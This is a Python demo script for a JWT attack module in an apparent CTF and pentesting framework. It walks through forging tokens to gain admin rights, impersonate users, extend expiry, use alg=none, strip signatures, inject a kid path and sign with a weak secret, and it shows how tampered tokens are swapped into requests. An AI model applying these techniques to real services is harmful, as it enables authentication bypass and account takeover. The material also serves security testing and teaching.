#!/usr/bin/env python3
"""Demo script for JWT manipulation module

This script demonstrates the capabilities of the JWT manipulation module.
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.modules.jwt_manipulation import (
    JWTInspector,
    JWTTamperer,
    JWTReplacer,
    JWTVulnerabilityScanner,
    JWTToken,
)
from app.core.request_handler import RequestHandler


async def demo_jwt_detection():
    """Demonstrate JWT detection capabilities"""
    print("=" * 60)
    print("JWT DETECTION DEMO")
    print("=" * 60)
    
    # Initialize components
    # config = Settings()
    request_handler = RequestHandler()
    inspector = JWTInspector(request_handler)
    
    # Example JWT (from jwt.io)
    example_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTUxNjIzOTAyMn0.3fFXXqRPdHVmXPdKwvvTZnCXXXqRPdHVmXPdKwvvTZnC"
    
    print(f"\nExample JWT: {example_jwt[:50]}...\n")
    
    # Decode JWT
    token = inspector.decode_jwt(example_jwt)
    
    if token:
        print(inspector.display_token_info(token))
    else:
        print("Failed to decode JWT")
    
    print()


async def demo_jwt_tampering():
    """Demonstrate JWT tampering capabilities"""
    print("=" * 60)
    print("JWT TAMPERING DEMO")
    print("=" * 60)
    
    # Initialize components
    # config = Settings()
    request_handler = RequestHandler()
    inspector = JWTInspector(request_handler)
    tamperer = JWTTamperer()
    
    # Example JWT
    example_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTUxNjIzOTAyMn0.3fFXXqRPdHVmXPdKwvvTZnCXXXqRPdHVmXPdKwvvTZnC"
    
    # Decode original token
    token = inspector.decode_jwt(example_jwt)
    
    if not token:
        print("Failed to decode JWT")
        return
    
    print("\n1. ORIGINAL TOKEN")
    print("-" * 60)
    print(f"Algorithm: {token.algorithm}")
    print(f"isAdmin: {token.payload.get('isAdmin')}")
    print(f"Name: {token.payload.get('name')}")
    
    # Test 1: Edit claim
    print("\n2. EDIT CLAIM (isAdmin: false -> true)")
    print("-" * 60)
    modified_token = tamperer.edit_claim(token, "isAdmin", True, "payload")
    decoded_modified = inspector.decode_jwt(modified_token)
    print(f"Modified JWT: {modified_token[:50]}...")
    print(f"isAdmin: {decoded_modified.payload.get('isAdmin')}")
    
    # Test 2: Algorithm confusion (none)
    print("\n3. ALGORITHM CONFUSION (alg=none)")
    print("-" * 60)
    none_token = tamperer.algorithm_confusion_none(token)
    decoded_none = inspector.decode_jwt(none_token)
    print(f"Modified JWT: {none_token[:50]}...")
    print(f"Algorithm: {decoded_none.algorithm}")
    print(f"Signature: {decoded_none.signature if decoded_none.signature else '(empty)'}")
    
    # Test 3: Modify kid
    print("\n4. MODIFY KID PARAMETER")
    print("-" * 60)
    kid_token = tamperer.modify_kid(token, "../../../dev/null")
    decoded_kid = inspector.decode_jwt(kid_token)
    print(f"Modified JWT: {kid_token[:50]}...")
    print(f"Kid: {decoded_kid.key_id}")
    
    # Test 4: Remove signature
    print("\n5. REMOVE SIGNATURE")
    print("-" * 60)
    no_sig_token = tamperer.remove_signature(token)
    decoded_no_sig = inspector.decode_jwt(no_sig_token)
    print(f"Modified JWT: {no_sig_token[:50]}...")
    print(f"Signature: {decoded_no_sig.signature if decoded_no_sig.signature else '(empty)'}")
    
    # Test 5: Sign with weak secret
    print("\n6. SIGN WITH WEAK SECRET")
    print("-" * 60)
    weak_secret = "secret"
    signed_token = tamperer.sign_with_key(token, weak_secret, "HS256")
    print(f"Signed JWT: {signed_token[:50]}...")
    print(f"Secret used: {weak_secret}")
    
    print()


async def demo_jwt_replacement():
    """Demonstrate automatic JWT replacement"""
    print("=" * 60)
    print("JWT REPLACEMENT DEMO")
    print("=" * 60)
    
    # Initialize components
    # config = Settings()
    request_handler = RequestHandler()
    inspector = JWTInspector(request_handler)
    tamperer = JWTTamperer()
    replacer = JWTReplacer(request_handler)
    
    # Example JWT
    original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTUxNjIzOTAyMn0.3fFXXqRPdHVmXPdKwvvTZnCXXXqRPdHVmXPdKwvvTZnC"
    
    # Decode and tamper
    token = inspector.decode_jwt(original_jwt)
    tampered_jwt = tamperer.edit_claim(token, "isAdmin", True, "payload")
    
    print(f"\nOriginal JWT: {original_jwt[:50]}...")
    print(f"Tampered JWT: {tampered_jwt[:50]}...")
    
    # Register replacement
    replacer.register_replacement(original_jwt, tampered_jwt)
    print("\n✓ Replacement registered")
    
    # Create a mock request
    from app.core.http_models import Request
    
    original_request = Request(
        method="GET",
        url="https://example.com/api/user",
        headers={"Authorization": f"Bearer {original_jwt}"},
    )
    
    print(f"\nOriginal request Authorization header:")
    print(f"  {original_request.headers['Authorization'][:70]}...")
    
    # Apply replacement
    modified_request = replacer.apply_replacements(original_request)
    
    print(f"\nModified request Authorization header:")
    print(f"  {modified_request.headers['Authorization'][:70]}...")
    
    # Verify replacement
    if tampered_jwt in modified_request.headers['Authorization']:
        print("\n✓ JWT successfully replaced in request!")
    else:
        print("\n✗ JWT replacement failed")
    
    print()


async def demo_vulnerability_scanning():
    """Demonstrate JWT vulnerability scanning"""
    print("=" * 60)
    print("JWT VULNERABILITY SCANNING DEMO")
    print("=" * 60)
    
    print("\nNote: This demo shows the scanning process.")
    print("Actual vulnerability detection requires a live target.\n")
    
    # Initialize components
    # config = Settings()
    request_handler = RequestHandler()
    inspector = JWTInspector(request_handler)
    scanner = JWTVulnerabilityScanner(request_handler)
    
    # Example JWT
    example_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTUxNjIzOTAyMn0.3fFXXqRPdHVmXPdKwvvTZnCXXXqRPdHVmXPdKwvvTZnC"
    
    # Decode token
    token = inspector.decode_jwt(example_jwt)
    
    if not token:
        print("Failed to decode JWT")
        return
    
    print("Scanning for vulnerabilities...")
    print("\nTests performed:")
    print("  1. Algorithm confusion (alg=none)")
    print("  2. Missing signature acceptance")
    print("  3. Weak secret brute-force")
    print("  4. Kid parameter injection")
    
    # Note: We can't actually scan without a live target
    print("\nTo scan a live target, use:")
    print("  vulnerabilities = await scanner.scan_token(")
    print("      token=token,")
    print("      test_url='https://target.com/api/endpoint',")
    print("      test_method='GET',")
    print("      test_headers={'Authorization': f'Bearer {token.raw_token}'}")
    print("  )")
    
    print("\nExample vulnerability output:")
    print("-" * 60)
    print("[CRITICAL] algorithm_confusion_none")
    print("Description: JWT accepts algorithm 'none' - signature verification bypassed")
    print("Evidence:")
    print("  - Modified JWT with alg=none accepted")
    print("  - Response status: 200")
    print("  - Signature verification is not enforced")
    
    print()


async def demo_common_attacks():
    """Demonstrate common JWT attack scenarios"""
    print("=" * 60)
    print("COMMON JWT ATTACK SCENARIOS")
    print("=" * 60)
    
    # Initialize components
    # config = Settings()
    request_handler = RequestHandler()
    inspector = JWTInspector(request_handler)
    tamperer = JWTTamperer()
    
    # Example JWT
    example_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaXNBZG1pbiI6ZmFsc2UsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    token = inspector.decode_jwt(example_jwt)
    
    if not token:
        print("Failed to decode JWT")
        return
    
    print("\nScenario 1: Privilege Escalation")
    print("-" * 60)
    print("Goal: Change role from 'user' to 'admin'")
    print(f"Original role: {token.payload.get('role')}")
    
    admin_token = tamperer.edit_claim(token, "role", "admin", "payload")
    decoded_admin = inspector.decode_jwt(admin_token)
    print(f"Modified role: {decoded_admin.payload.get('role')}")
    print(f"Exploit JWT: {admin_token[:60]}...")
    
    print("\nScenario 2: Bypass Signature Verification")
    print("-" * 60)
    print("Goal: Remove signature to bypass verification")
    
    no_sig_token = tamperer.algorithm_confusion_none(token)
    decoded_no_sig = inspector.decode_jwt(no_sig_token)
    print(f"Algorithm: {decoded_no_sig.algorithm}")
    print(f"Signature: {decoded_no_sig.signature if decoded_no_sig.signature else '(empty)'}")
    print(f"Exploit JWT: {no_sig_token[:60]}...")
    
    print("\nScenario 3: User Impersonation")
    print("-" * 60)
    print("Goal: Change subject to impersonate another user")
    print(f"Original subject: {token.payload.get('sub')}")
    
    impersonate_token = tamperer.edit_claim(token, "sub", "9999999999", "payload")
    decoded_impersonate = inspector.decode_jwt(impersonate_token)
    print(f"Modified subject: {decoded_impersonate.payload.get('sub')}")
    print(f"Exploit JWT: {impersonate_token[:60]}...")
    
    print("\nScenario 4: Token Expiration Bypass")
    print("-" * 60)
    print("Goal: Extend token expiration")
    
    # Add far future expiration
    import time
    future_exp = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year from now
    extended_token = tamperer.edit_claim(token, "exp", future_exp, "payload")
    decoded_extended = inspector.decode_jwt(extended_token)
    print(f"New expiration: {decoded_extended.payload.get('exp')}")
    print(f"Exploit JWT: {extended_token[:60]}...")
    
    print()


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("JWT MANIPULATION MODULE - COMPREHENSIVE DEMO")
    print("=" * 60)
    print("\nThis demo showcases the JWT manipulation capabilities")
    print("of the VulnChain CTF framework.\n")
    
    # Run demos
    await demo_jwt_detection()
    await demo_jwt_tampering()
    await demo_jwt_replacement()
    await demo_vulnerability_scanning()
    await demo_common_attacks()
    
    print("=" * 60)
    print("DEMO COMPLETE")
    print("=" * 60)
    print("\nFor more information, see:")
    print("  - backend/app/modules/README_JWT.md")
    print("  - backend/app/modules/jwt_manipulation.py")
    print()


if __name__ == "__main__":
    asyncio.run(main())
